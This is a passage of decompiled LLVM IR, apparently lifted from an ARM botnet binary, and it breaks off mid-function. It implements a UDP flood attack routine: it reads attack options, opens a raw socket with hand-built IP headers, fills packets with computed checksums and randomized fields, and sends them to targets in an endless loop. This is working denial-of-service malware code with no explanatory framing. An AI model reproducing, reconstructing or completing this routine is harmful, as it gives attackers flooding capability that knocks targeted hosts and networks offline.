  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %v18_8eec = load i32, i32* @sb, align 4
  %v27_8eec = load i32, i32* @lr, align 4
  store i32 %arg2, i32* @r8, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r7, align 4
  %v2_8f08 = call i32 @calloc(i32 %arg1, i32 4)
  %v0_8f0c = load i32, i32* @r5, align 4
  store i32 %v0_8f0c, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_8f1c = load i32, i32* @r4, align 4
  store i32 %v0_8f1c, i32* %r0.global-to-local, align 4
  %v5_8f20 = inttoptr i32 %v0_8f0c to i32*
  %v6_8f20 = call i32 @attack_get_opt_int(i32 %v0_8f1c, i32* %v5_8f20, i32 2, i32 0)
  %v1_8f2c = urem i32 %v6_8f20, 256
  store i32 %v1_8f2c, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_8f38 = load i32, i32* @r5, align 4
  store i32 %v0_8f38, i32* %r1.global-to-local, align 4
  %v0_8f3c = load i32, i32* @r4, align 4
  store i32 %v0_8f3c, i32* %r0.global-to-local, align 4
  %v5_8f40 = trunc i32 %v6_8f20 to i8
  %v6_8f44 = inttoptr i32 %v0_8f38 to i32*
  %v7_8f44 = call i32 @attack_get_opt_int(i32 %v0_8f3c, i32* %v6_8f44, i32 3, i32 65535)
  %v0_8f48 = load i32, i32* @r5, align 4
  store i32 %v0_8f48, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_8f58 = load i32, i32* @r4, align 4
  store i32 %v0_8f58, i32* %r0.global-to-local, align 4
  %v5_8f5c = inttoptr i32 %v0_8f48 to i32*
  %v6_8f5c = call i32 @attack_get_opt_int(i32 %v0_8f58, i32* %v5_8f5c, i32 4, i32 64)
  %v1_8f64 = urem i32 %v6_8f5c, 256
  store i32 %v1_8f64, i32* %ip.global-to-local, align 4
  %v0_8f68 = load i32, i32* @r5, align 4
  store i32 %v0_8f68, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_8f74 = load i32, i32* @r4, align 4
  store i32 %v0_8f74, i32* %r0.global-to-local, align 4
  %v6_8f7c = inttoptr i32 %v0_8f68 to i32*
  %v7_8f7c = call i32 @attack_get_opt_int(i32 %v0_8f74, i32* %v6_8f7c, i32 5, i32 0)
  %v1_8f88 = urem i32 %v7_8f7c, 256
  store i32 %v1_8f88, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_8f94 = load i32, i32* @r5, align 4
  store i32 %v0_8f94, i32* %r1.global-to-local, align 4
  %v0_8f98 = load i32, i32* @r4, align 4
  store i32 %v0_8f98, i32* %r0.global-to-local, align 4
  %v5_8fa0 = inttoptr i32 %v0_8f94 to i32*
  %v6_8fa0 = call i32 @attack_get_opt_int(i32 %v0_8f98, i32* %v5_8fa0, i32 6, i32 65535)
  %v0_8fa8 = load i32, i32* @r5, align 4
  store i32 %v0_8fa8, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_8fa0, i32* %sb.global-to-local, align 4
  %v0_8fb8 = load i32, i32* @r4, align 4
  store i32 %v0_8fb8, i32* %r0.global-to-local, align 4
  %v4_8fbc = inttoptr i32 %v0_8fa8 to i32*
  %v5_8fbc = call i32 @attack_get_opt_int(i32 %v0_8fb8, i32* %v4_8fbc, i32 7, i32 65535)
  %v0_8fc0 = load i32, i32* @r5, align 4
  store i32 %v0_8fc0, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  store i32 %v5_8fbc, i32* @sl, align 4
  %v0_8fd0 = load i32, i32* @r4, align 4
  store i32 %v0_8fd0, i32* %r0.global-to-local, align 4
  %v4_8fd4 = inttoptr i32 %v0_8fc0 to i32*
  %v5_8fd4 = call i32 @attack_get_opt_int(i32 %v0_8fd0, i32* %v4_8fd4, i32 0, i32 512)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_8fe0 = load i32, i32* @r5, align 4
  store i32 %v0_8fe0, i32* %r1.global-to-local, align 4
  store i32 %v5_8fd4, i32* @r6, align 4
  %v0_8fe8 = load i32, i32* @r4, align 4
  store i32 %v0_8fe8, i32* %r0.global-to-local, align 4
  %v4_8fec = inttoptr i32 %v0_8fe0 to i32*
  %v5_8fec = call i32 @attack_get_opt_int(i32 %v0_8fe8, i32* %v4_8fec, i32 1, i32 1)
  %v2_8ff8 = load i32, i32* @global_var_241f0.57, align 4
  store i32 %v2_8ff8, i32* %r3.global-to-local, align 4
  %v1_8ffc = urem i32 %v5_8fec, 256
  store i32 %v1_8ffc, i32* %ip.global-to-local, align 4
  %v0_9000 = load i32, i32* @r5, align 4
  store i32 %v0_9000, i32* %r1.global-to-local, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_9008 = load i32, i32* @r4, align 4
  store i32 %v0_9008, i32* %r0.global-to-local, align 4
  %v5_9010 = inttoptr i32 %v0_9000 to i32*
  %v6_9010 = call i32 @attack_get_opt_int(i32 %v0_9008, i32* %v5_9010, i32 25, i32 %v2_8ff8)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_9024 = call i32 @socket(i32 2, i32 3, i32 17)
  store i32 %v3_9024, i32* %r0.global-to-local, align 4
  %v7_9028 = icmp eq i32 %v3_9024, -1
  store i1 %v7_9028, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_9024, i32* @fp, align 4
  br i1 %v7_9028, label %dec_label_pc_93c8, label %dec_label_pc_9034

dec_label_pc_9034:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_903c = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_903c, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_9050 = call i32 @__GI_setsockopt(i32 %v3_9024, i32 0, i32 3, i32 %v6_903c, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_9050, i32* %r0.global-to-local, align 4
  %v7_9054 = icmp eq i32 %v5_9050, -1
  store i1 %v7_9054, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9054, label %dec_label_pc_93c0, label %dec_label_pc_905c

dec_label_pc_905c:                                ; preds = %dec_label_pc_9034
  %v0_905c = load i32, i32* @r6, align 4
  store i32 1460, i32* %r3.global-to-local, align 4
  %v3_9068 = urem i32 %v0_905c, 65536
  store i32 %v3_9068, i32* %r2.global-to-local, align 4
  %v3_906c = icmp ugt i32 %v3_9068, 1459
  %v9_906c = icmp eq i32 %v3_9068, 1460
  store i1 %v9_906c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_906c, label %bb, label %bb48

bb:                                               ; preds = %dec_label_pc_905c
  store i32 1460, i32* %r2.global-to-local, align 4
  br label %bb48

bb48:                                             ; preds = %dec_label_pc_905c, %bb
  %v0_90c8 = phi i32 [ %v3_9068, %dec_label_pc_905c ], [ 1460, %bb ]
  store i32 %v7_8f44, i32* %r0.global-to-local, align 4
  %v0_9078 = load i32, i32* %sb.global-to-local, align 4
  %v3_9080 = urem i32 %v0_9078, 65536
  store i32 %v3_9080, i32* %ip.global-to-local, align 4
  %v0_9084 = load i32, i32* @r7, align 4
  %v2_9084 = icmp eq i32 %v0_9084, 0
  store i1 %v2_9084, i1* %cpsr_z.global-to-local, align 1
  %v0_9088 = load i32, i32* @sl, align 4
  %v3_9088 = mul i32 %v0_9088, 65536
  br i1 %v2_9084, label %bb49, label %bb50

bb49:                                             ; preds = %bb48
  store i32 %v0_90c8, i32* %ip.global-to-local, align 4
  br label %bb50

bb50:                                             ; preds = %bb48, %bb49
  %v1_90b8 = phi i32 [ %v3_9080, %bb48 ], [ %v0_90c8, %bb49 ]
  %v3_9098 = urem i32 %v0_9088, 65536
  store i32 %v3_9098, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_90a0 = urem i32 %v7_8f44, 65536
  store i32 %v3_90a0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_9084, label %.thread, label %dec_label_pc_90c0

.thread:                                          ; preds = %bb50
  %v2_90b4 = add nsw i32 %v1_90b8, 28
  store i32 %v2_90b4, i32* @sb, align 4
  %v2_90b8 = add nsw i32 %v1_90b8, 8
  store i32 %v2_90b8, i32* @sl, align 4
  br label %dec_label_pc_91e4.preheader

dec_label_pc_90c0:                                ; preds = %bb50
  %v1_90c8 = add nuw nsw i32 %v0_90c8, 28
  store i32 %v1_90c8, i32* @sb, align 4
  %v1_90cc = add nuw nsw i32 %v0_90c8, 8
  store i32 %v1_90cc, i32* @sl, align 4
  %tmp51 = mul i32 %v0_9078, 256
  %v3_90e0 = and i32 %tmp51, 65280
  %tmp52 = udiv i32 %v0_9078, 256
  %v4_90f0 = urem i32 %tmp52, 256
  %v5_90f0 = or i32 %v4_90f0, %v3_90e0
  store i32 %v5_90f0, i32* @r6, align 4
  store i32 %v3_9088, i32* %r1.global-to-local, align 4
  %tmp53 = mul nuw nsw i32 %v1_90c8, 256
  %v3_90fc = and i32 %tmp53, 65280
  store i32 %v3_90fc, i32* %r3.global-to-local, align 4
  %tmp54 = mul i32 %v0_9088, 256
  %v3_9100 = and i32 %tmp54, 65280
  %tmp55 = mul nuw nsw i32 %v1_90cc, 256
  %v3_9104 = and i32 %tmp55, 65280
  store i32 %v3_9104, i32* %ip.global-to-local, align 4
  %tmp56 = udiv i32 %v1_90c8, 256
  %v4_9108 = urem i32 %tmp56, 256
  %v5_9108 = or i32 %v4_9108, %v3_90fc
  store i32 %v5_9108, i32* @lr, align 4
  %tmp57 = udiv i32 %v0_9088, 256
  %v4_910c = urem i32 %tmp57, 256
  %v5_910c = or i32 %v4_910c, %v3_9100
  store i32 %v5_910c, i32* %r0.global-to-local, align 4
  %trunc = trunc i32 %v1_90cc to i16
  %rev = call i16 @llvm.bswap.i16(i16 %trunc)
  %tmp58 = mul i32 %v7_8f44, 256
  %v3_9114 = and i32 %tmp58, 65280
  store i32 %v3_9114, i32* %r2.global-to-local, align 4
  %tmp59 = udiv i32 %v7_8f44, 256
  %v4_9124 = urem i32 %tmp59, 256
  %v5_9124 = or i32 %v4_9124, %v3_9114
  store i32 %v5_9124, i32* @r5, align 4
  store i32 0, i32* @r4, align 4
  %v4_917c = sext i8 %v5_8f40 to i32
  %sext6 = mul nuw i32 %v5_9108, 65536
  %v4_9198 = sdiv i32 %sext6, 65536
  %sext7 = mul nuw i32 %v5_910c, 65536
  %v7_91cc = sdiv i32 %sext7, 65536
  %v1_918c = trunc i32 %v6_8f5c to i8
  %v3_91cc = sext i16 %rev to i32
  br label %dec_label_pc_912c

dec_label_pc_912c:                                ; preds = %.thread9, %dec_label_pc_90c0
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 1510, i32* %r0.global-to-local, align 4
  %v2_9138 = call i32 @calloc(i32 1510, i32 1)
  store i32 %v2_9138, i32* %r0.global-to-local, align 4
  store i32 %v2_8f08, i32* %r3.global-to-local, align 4
  %v3_9140 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_9140, i32* %r1.global-to-local, align 4
  %v2_9144 = load i32, i32* @r4, align 4
  %v5_9144 = mul i32 %v2_9144, 4
  %v6_9144 = add i32 %v5_9144, %v2_8f08
  %v7_9144 = inttoptr i32 %v6_9144 to i32*
  store i32 %v2_9138, i32* %v7_9144, align 4
  %v0_9148 = load i32, i32* %r3.global-to-local, align 4
  %v1_9148 = load i32, i32* %r1.global-to-local, align 4
  %v4_9148 = mul i32 %v1_9148, 4
  %v5_9148 = add i32 %v4_9148, %v0_9148
  %v6_9148 = inttoptr i32 %v5_9148 to i32*
  %v7_9148 = load i32, i32* %v6_9148, align 4
  store i32 %v7_9148, i32* %r0.global-to-local, align 4
  %v1_914c = inttoptr i32 %v7_9148 to i8*
  %v2_914c = load i8, i8* %v1_914c, align 1
  %tmp = urem i8 %v2_914c, 16
  %v1_9150 = zext i8 %tmp to i32
  %v1_9154 = or i32 %v1_9150, 64
  store i32 %v1_9154, i32* %r3.global-to-local, align 4
  %v1_9158 = trunc i32 %v1_9154 to i8
  store i8 %v1_9158, i8* %v1_914c, align 1
  %v0_915c = load i32, i32* %r0.global-to-local, align 4
  %v1_915c = inttoptr i32 %v0_915c to i8*
  %v2_915c = load i8, i8* %v1_915c, align 1
  %v1_9160 = and i8 %v2_915c, -16
  %v1_9164 = or i8 %v1_9160, 5
  store i32 %v1_8f88, i32* %ip.global-to-local, align 4
  %v0_916c = load i32, i32* %r1.global-to-local, align 4
  %v3_916c = mul i32 %v0_916c, 32
  store i32 %v3_916c, i32* %r2.global-to-local, align 4
  store i8 %v1_9164, i8* %v1_915c, align 1
  %v0_9174 = load i32, i32* %r1.global-to-local, align 4
  %v1_9174 = add i32 %v0_9174, 1
  store i32 %v1_9174, i32* @r4, align 4
  %v0_9178 = load i32, i32* %r2.global-to-local, align 4
  %tmp61 = mul i32 %v0_9174, -8
  %v5_9178 = add i32 %v0_9178, %tmp61
  store i32 %v5_9178, i32* %r2.global-to-local, align 4
  store i32 %v4_917c, i32* %r1.global-to-local, align 4
  %v2_9180 = load i32, i32* %r0.global-to-local, align 4
  %v3_9180 = add i32 %v2_9180, 1
  %v4_9180 = inttoptr i32 %v3_9180 to i8*
  store i8 %v5_8f40, i8* %v4_9180, align 1
  store i32 %v1_8f64, i32* %r3.global-to-local, align 4
  %v0_9188 = load i32, i32* %ip.global-to-local, align 4
  %v2_9188 = icmp eq i32 %v0_9188, 0
  store i1 %v2_9188, i1* %cpsr_z.global-to-local, align 1
  %v2_918c = load i32, i32* %r0.global-to-local, align 4
  %v3_918c = add i32 %v2_918c, 8
  %v4_918c = inttoptr i32 %v3_918c to i8*
  store i8 %v1_918c, i8* %v4_918c, align 1
  %v0_9190 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_9190, label %.thread9, label %bb60

bb60:                                             ; preds = %dec_label_pc_912c
  store i32 64, i32* %r3.global-to-local, align 4
  %v3_9194 = load i32, i32* %r0.global-to-local, align 4
  %v4_9194 = add i32 %v3_9194, 6
  %v5_9194 = inttoptr i32 %v4_9194 to i16*
  store i16 64, i16* %v5_9194, align 2
  br label %.thread9

.thread9:                                         ; preds = %dec_label_pc_912c, %bb60
  store i32 %v4_9198, i32* %ip.global-to-local, align 4
  store i32 17, i32* %r3.global-to-local, align 4
  %v2_91a0 = load i32, i32* %r0.global-to-local, align 4
  %v3_91a0 = add i32 %v2_91a0, 9
  %v4_91a0 = inttoptr i32 %v3_91a0 to i8*
  store i8 17, i8* %v4_91a0, align 1
  %v0_91a4 = load i32, i32* %ip.global-to-local, align 4
  %v1_91a4 = trunc i32 %v0_91a4 to i16
  %v2_91a4 = load i32, i32* %r0.global-to-local, align 4
  %v3_91a4 = add i32 %v2_91a4, 2
  %v4_91a4 = inttoptr i32 %v3_91a4 to i16*
  store i16 %v1_91a4, i16* %v4_91a4, align 2
  store i32 %v6_9010, i32* %ip.global-to-local, align 4
  %v1_91ac = load i32, i32* %r0.global-to-local, align 4
  %v2_91ac = add i32 %v1_91ac, 12
  %v3_91ac = inttoptr i32 %v2_91ac to i32*
  store i32 %v6_9010, i32* %v3_91ac, align 4
  %v0_91b0 = load i32, i32* %r2.global-to-local, align 4
  %v1_91b0 = load i32, i32* @r8, align 4
  %v2_91b0 = add i32 %v1_91b0, %v0_91b0
  store i32 %v2_91b0, i32* %r2.global-to-local, align 4
  %v1_91b4 = add i32 %v2_91b0, 16
  %v2_91b4 = inttoptr i32 %v1_91b4 to i32*
  %v3_91b4 = load i32, i32* %v2_91b4, align 4
  store i32 %v3_91b4, i32* %r3.global-to-local, align 4
  %v0_91b8 = load i32, i32* @r5, align 4
  %v1_91b8 = trunc i32 %v0_91b8 to i16
  %v2_91b8 = load i32, i32* %r0.global-to-local, align 4
  %v3_91b8 = add i32 %v2_91b8, 4
  %v4_91b8 = inttoptr i32 %v3_91b8 to i16*
  store i16 %v1_91b8, i16* %v4_91b8, align 2
  %v0_91bc = load i32, i32* %r0.global-to-local, align 4
  %v1_91bc = add i32 %v0_91bc, 20
  store i32 %v1_91bc, i32* %r1.global-to-local, align 4
  %v0_91c0 = load i32, i32* %r3.global-to-local, align 4
  %v2_91c0 = add i32 %v0_91bc, 16
  %v3_91c0 = inttoptr i32 %v2_91c0 to i32*
  store i32 %v0_91c0, i32* %v3_91c0, align 4
  %v0_91c4 = load i32, i32* @r6, align 4
  %v1_91c4 = trunc i32 %v0_91c4 to i16
  %v2_91c4 = load i32, i32* %r0.global-to-local, align 4
  %v3_91c4 = add i32 %v2_91c4, 20
  %v4_91c4 = inttoptr i32 %v3_91c4 to i16*
  store i16 %v1_91c4, i16* %v4_91c4, align 2
  store i32 %v3_91cc, i32* %r0.global-to-local, align 4
  store i32 %v7_91cc, i32* %r3.global-to-local, align 4
  %v0_91d0 = load i32, i32* @r4, align 4
  %v1_91d0 = load i32, i32* @r7, align 4
  %v9_91d0 = icmp eq i32 %v0_91d0, %v1_91d0
  store i1 %v9_91d0, i1* %cpsr_z.global-to-local, align 1
  %v2_91d4 = load i32, i32* %r1.global-to-local, align 4
  %v3_91d4 = add i32 %v2_91d4, 4
  %v4_91d4 = inttoptr i32 %v3_91d4 to i16*
  store i16 %rev, i16* %v4_91d4, align 2
  %v0_91d8 = load i32, i32* %r3.global-to-local, align 4
  %v1_91d8 = trunc i32 %v0_91d8 to i16
  %v2_91d8 = load i32, i32* %r1.global-to-local, align 4
  %v3_91d8 = add i32 %v2_91d8, 2
  %v4_91d8 = inttoptr i32 %v3_91d8 to i16*
  store i16 %v1_91d8, i16* %v4_91d8, align 2
  %v0_91dc = load i32, i32* @r4, align 4
  store i32 %v0_91dc, i32* %stack_var_-44, align 4
  %v5_91e0 = icmp slt i32 %v0_91d0, %v1_91d0
  br i1 %v5_91e0, label %dec_label_pc_912c, label %dec_label_pc_91e4.preheader.loopexit

dec_label_pc_91e4.preheader.loopexit:             ; preds = %.thread9
  %v0_91e8.pre.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_91e4.preheader

dec_label_pc_91e4.preheader:                      ; preds = %.thread, %dec_label_pc_91e4.preheader.loopexit
  %v0_91e8.pre = phi i32 [ %v0_91e8.pre.pre, %dec_label_pc_91e4.preheader.loopexit ], [ 0, %.thread ]
  %v3_9350 = icmp eq i32 %v6_9010, -1
  %v8_9350 = icmp eq i32 %v6_9010, -1
  %v3_9368 = icmp eq i32 %v3_90a0, 65535
  %v2_93a4 = icmp eq i32 %v1_8ffc, 0
  br label %dec_label_pc_91e4

dec_label_pc_91e4:                                ; preds = %dec_label_pc_91e4, %dec_label_pc_92e4, %dec_label_pc_91e4.preheader
  %v0_91e8 = phi i32 [ %v0_91e8.pre, %dec_label_pc_91e4.preheader ], [ 0, %dec_label_pc_92e4 ], [ 0, %dec_label_pc_91e4 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_91e8 = icmp eq i32 %v0_91e8, 0
  store i1 %v2_91e8, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_91e8, label %dec_label_pc_91e4, label %dec_label_pc_91f4

dec_label_pc_91f4:                                ; preds = %dec_label_pc_91e4, %dec_label_pc_92e4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_91f8

dec_label_pc_91f8:                                ; preds = %dec_label_pc_9260, %dec_label_pc_91f4
  %v1_920c = phi i32 [ %v1_92d4, %dec_label_pc_9260 ], [ 0, %dec_label_pc_91f4 ]
  %v5_91fc = mul i32 %v1_920c, 24
  %v1_9200 = load i32, i32* @r8, align 4
  %v2_9200 = add i32 %v1_9200, %v5_91fc
  store i32 %v2_9200, i32* %r3.global-to-local, align 4
  store i32 %v2_8f08, i32* %r1.global-to-local, align 4
  %v1_9208 = add i32 %v2_9200, 20
  %v2_9208 = inttoptr i32 %v1_9208 to i8*
  %v3_9208 = load i8, i8* %v2_9208, align 1
  %v4_9208 = zext i8 %v3_9208 to i32
  store i32 %v4_9208, i32* %r2.global-to-local, align 4
  %v4_920c = mul i32 %v1_920c, 4
  %v5_920c = add i32 %v4_920c, %v2_8f08
  %v6_920c = inttoptr i32 %v5_920c to i32*
  %v7_920c = load i32, i32* %v6_920c, align 4
  store i32 %v7_920c, i32* @r5, align 4
  %v7_9210 = icmp eq i8 %v3_9208, 31
  store i1 %v7_9210, i1* %cpsr_z.global-to-local, align 1
  %v1_9214 = add i32 %v7_920c, 20
  store i32 %v1_9214, i32* @r6, align 4
  %tmp62 = icmp ult i8 %v3_9208, 32
  br i1 %tmp62, label %dec_label_pc_92f8, label %dec_label_pc_921c

dec_label_pc_921c:                                ; preds = %dec_label_pc_91f8
  store i32 %v6_9010, i32* %r3.global-to-local, align 4
  store i1 %v8_9350, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_9350, label %dec_label_pc_9358, label %dec_label_pc_9228

dec_label_pc_9228:                                ; preds = %dec_label_pc_92f8, %dec_label_pc_921c
  store i32 %v3_90a0, i32* %ip.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_9368, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_9368, label %dec_label_pc_9374, label %dec_label_pc_923c

dec_label_pc_923c:                                ; preds = %dec_label_pc_9358.dec_label_pc_923c_crit_edge, %dec_label_pc_9228
  %v1_9240 = phi i32 [ %v1_9240.pre, %dec_label_pc_9358.dec_label_pc_923c_crit_edge ], [ 65535, %dec_label_pc_9228 ]
  store i32 %v3_9080, i32* %r0.global-to-local, align 4
  %v9_9240 = icmp eq i32 %v3_9080, %v1_9240
  store i1 %v9_9240, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_9240, label %dec_label_pc_9388, label %dec_label_pc_9248

dec_label_pc_9248:                                ; preds = %dec_label_pc_9374, %dec_label_pc_923c
  %v1_924c = phi i32 [ %v1_9380, %dec_label_pc_9374 ], [ %v1_9240, %dec_label_pc_923c ]
  store i32 %v3_9098, i32* %r1.global-to-local, align 4
  %v9_924c = icmp eq i32 %v3_9098, %v1_924c
  store i1 %v9_924c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_924c, label %dec_label_pc_939c, label %dec_label_pc_9254

dec_label_pc_9254:                                ; preds = %dec_label_pc_9388, %dec_label_pc_9248
  store i32 %v1_8ffc, i32* %r3.global-to-local, align 4
  store i1 %v2_93a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_93a4, label %dec_label_pc_9260, label %dec_label_pc_93b0

dec_label_pc_9260:                                ; preds = %dec_label_pc_9254, %dec_label_pc_939c, %dec_label_pc_93b0
  store i32 0, i32* %ip.global-to-local, align 4
  %v2_9264 = load i32, i32* @r5, align 4
  %v3_9264 = add i32 %v2_9264, 10
  %v4_9264 = inttoptr i32 %v3_9264 to i16*
  store i16 0, i16* %v4_9264, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_926c = load i32, i32* @r5, align 4
  store i32 %v0_926c, i32* @r0, align 4
  %v2_9270 = call i32 @checksum_generic(i32 %v0_926c, i32 20)
  %v3_9270 = trunc i32 %v2_9270 to i16
  %v3_9274 = load i32, i32* @r5, align 4
  %v4_9274 = add i32 %v3_9274, 10
  %v5_9274 = inttoptr i32 %v4_9274 to i16*
  store i16 %v3_9270, i16* %v5_9274, align 2
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_927c = load i32, i32* @r6, align 4
  %v3_927c = add i32 %v2_927c, 6
  %v4_927c = inttoptr i32 %v3_927c to i16*
  store i16 0, i16* %v4_927c, align 2
  %v0_9280 = load i32, i32* @r6, align 4
  store i32 %v0_9280, i32* @r1, align 4
  %v1_9284 = add i32 %v0_9280, 4
  %v2_9284 = inttoptr i32 %v1_9284 to i16*
  %v3_9284 = load i16, i16* %v2_9284, align 2
  %v4_9284 = zext i16 %v3_9284 to i32
  store i32 %v4_9284, i32* %r2.global-to-local, align 4
  %v0_9288 = load i32, i32* @sl, align 4
  store i32 %v0_9288, i32* %r3.global-to-local, align 4
  %v0_928c = load i32, i32* @r5, align 4
  store i32 %v0_928c, i32* %r0.global-to-local, align 4
  %v4_9290 = call i32 @checksum_tcpudp(i32 %v0_928c, i32 %v0_9280, i32 %v4_9284, i32 %v0_9288)
  %v5_9290 = trunc i32 %v4_9290 to i16
  store i32 %v4_9290, i32* %r0.global-to-local, align 4
  %v3_9294 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_9294, i32* %r3.global-to-local, align 4
  %v3_9298 = mul i32 %v3_9294, 32
  store i32 %v3_9298, i32* %lr.global-to-local, align 4
  %v3_929c = load i32, i32* @r6, align 4
  %v4_929c = add i32 %v3_929c, 6
  %v5_929c = inttoptr i32 %v4_929c to i16*
  store i16 %v5_9290, i16* %v5_929c, align 2
  %v0_92a0 = load i32, i32* %lr.global-to-local, align 4
  %v1_92a0 = load i32, i32* %r3.global-to-local, align 4
  %tmp63 = mul i32 %v1_92a0, -8
  %v5_92a0 = add i32 %v0_92a0, %tmp63
  store i32 %v5_92a0, i32* %lr.global-to-local, align 4
  %v0_92a4 = load i32, i32* @r6, align 4
  %v1_92a4 = add i32 %v0_92a4, 2
  %v2_92a4 = inttoptr i32 %v1_92a4 to i16*
  %v3_92a4 = load i16, i16* %v2_92a4, align 2
  %v4_92a4 = zext i16 %v3_92a4 to i32
  store i32 %v4_92a4, i32* @r6, align 4
  %v1_92a8 = load i32, i32* @r8, align 4
  %v2_92a8 = add i32 %v1_92a8, %v5_92a0
  store i32 %v2_92a8, i32* @lr, align 4
  %v3_92ac = add i32 %v2_92a8, 2
  %v4_92ac = inttoptr i32 %v3_92ac to i16*
  store i16 %v3_92a4, i16* %v4_92ac, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_92b8 = load i32, i32* @r5, align 4
  store i32 %v0_92b8, i32* %r1.global-to-local, align 4
  %v0_92bc = load i32, i32* @fp, align 4
  store i32 %v0_92bc, i32* %r0.global-to-local, align 4
  %v0_92c0 = load i32, i32* @sb, align 4
  store i32 %v0_92c0, i32* %r2.global-to-local, align 4
  %v0_92c4 = load i32, i32* @lr, align 4
  %v6_92cc = call i32 @__libc_sendto(i32 %v0_92bc, i32 %v0_92b8, i32 %v0_92c0, i32 16384, i32 %v0_92c4, i32 16)
  %v3_92d0 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_92d0, i32* %r3.global-to-local, align 4
  %v1_92d4 = add i32 %v3_92d0, 1
  store i32 %v1_92d4, i32* %r0.global-to-local, align 4
  %v1_92d8 = load i32, i32* @r7, align 4
  %v9_92d8 = icmp eq i32 %v1_92d4, %v1_92d8
  store i1 %v9_92d8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_92d4, i32* %stack_var_-44, align 4
  %v5_92e0 = icmp slt i32 %v1_92d4, %v1_92d8
  br i1 %v5_92e0, label %dec_label_pc_91f8, label %dec_label_pc_92e4

dec_label_pc_92e4:                                ; preds = %dec_label_pc_9260
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_92e8 = icmp eq i32 %v1_92d8, 0
  store i1 %v2_92e8, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_92e8, label %dec_label_pc_91e4, label %dec_label_pc_91f4

dec_label_pc_92f8:                                ; preds = %dec_label_pc_91f8
  %v1_92f8 = add i32 %v2_9200, 16
  %v2_92f8 = inttoptr i32 %v1_92f8 to i32*
  %v3_92f8 = load i32, i32* %v2_92f8, align 4
  %v0_92fc = call i32 @rand_next()
  store i32 %v0_92fc, i32* %r0.global-to-local, align 4
  %v3_9300 = load i32, i32* %stack_var_-44, align 4
  %v5_9308 = mul i32 %v3_9300, 24
  %v1_930c = and i32 %v3_92f8, 16711680
  store i32 %v1_930c, i32* %ip.global-to-local, align 4
  %v3_9310 = udiv i32 %v3_92f8, 16777216
  %v4_9314 = udiv i32 %v1_930c, 256
  %v5_9314 = or i32 %v4_9314, %v3_9310
  store i32 %v5_9314, i32* %r2.global-to-local, align 4
  %v1_9318 = load i32, i32* @r8, align 4
  %v2_9318 = add i32 %v1_9318, %v5_9308
  store i32 %v2_9318, i32* %r1.global-to-local, align 4
  %v1_931c = and i32 %v3_92f8, ptrtoint (i32* @global_var_ff00.32 to i32)
  store i32 %v1_931c, i32* %r3.global-to-local, align 4
  %v1_9320 = add i32 %v2_9318, 20
  %v2_9320 = inttoptr i32 %v1_9320 to i8*
  %v3_9320 = load i8, i8* %v2_9320, align 1
  %v4_9320 = zext i8 %v3_9320 to i32
  store i32 %v4_9320, i32* %ip.global-to-local, align 4
  %v4_9324 = mul i32 %v1_931c, 256
  %v4_9328 = mul i32 %v3_92f8, 16777216
  %v5_9324 = or i32 %v4_9324, %v4_9328
